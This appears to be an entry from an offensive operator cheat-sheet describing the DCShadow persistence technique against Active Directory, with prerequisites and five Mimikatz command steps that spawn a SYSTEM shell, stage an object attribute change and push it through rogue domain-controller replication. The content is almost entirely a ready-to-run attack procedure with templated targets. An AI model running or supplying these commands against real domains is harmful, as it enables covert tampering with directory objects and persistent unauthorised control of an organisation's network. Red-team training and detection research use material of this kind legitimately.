---
technique: DCShadow
category: persistence
targets: Active Directory
protocols: MS-DRSR, RPC, LDAP
remote_capable: false
tags: dcshadow mimikatz persistence replication rogue-dc ad
---

# DCShadow

DCShadow registers a controlled host as a temporary domain controller replication source and pushes directory changes through replication paths rather than normal LDAP writes. Mimikatz requires two interactive contexts: one Domain Admin context to trigger the replication push and one `NT AUTHORITY\SYSTEM` context to stage the change.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Domain Admin | Needed for the trigger shell that registers and pushes the replication change |
| Local SYSTEM | Needed for the RPC shell that stages the object modification |
| Target object | Identify the object, attribute, and value before staging the change |

## Windows

### Step 1: Enable debug privilege

#mimikatz #privilege

Enable debug privilege in the Domain Admin Mimikatz shell before preparing the SYSTEM context.

```text title:"Enable debug privilege in Mimikatz"
privilege::debug
```
<!-- cheat -->

### Step 2: Spawn protected SYSTEM process

#mimikatz #system

Start a new Mimikatz process as `NT AUTHORITY\SYSTEM`; use that second shell as the DCShadow RPC shell.

```text title:"Spawn SYSTEM Mimikatz process"
process::runp
```
<!-- cheat -->

### Step 3: Confirm token

#mimikatz #token

Confirm which context each shell is running under before staging or pushing the change.

```text title:"Confirm current Mimikatz token"
token::whoami
```
<!-- cheat -->

### Step 4: Stage object change

#mimikatz #dcshadow #replication

Run from the SYSTEM RPC shell to stage the target object attribute change for replication.

```text title:"Stage DCShadow object attribute change"
lsadump::dcshadow /object:$target_object /attribute:$target_attribute /value:$target_value
```
<!-- cheat
var target_object
var target_attribute
var target_value
-->

### Step 5: Push replication change

#mimikatz #dcshadow #replication

Run from the Domain Admin trigger shell to register the temporary replication source, push the staged change, and unregister it.

```text title:"Push staged DCShadow change"
lsadump::dcshadow /push
```
<!-- cheat -->

## Linux

No Linux operator command is included here. The local repos only confirm the Mimikatz workflow for DCShadow.
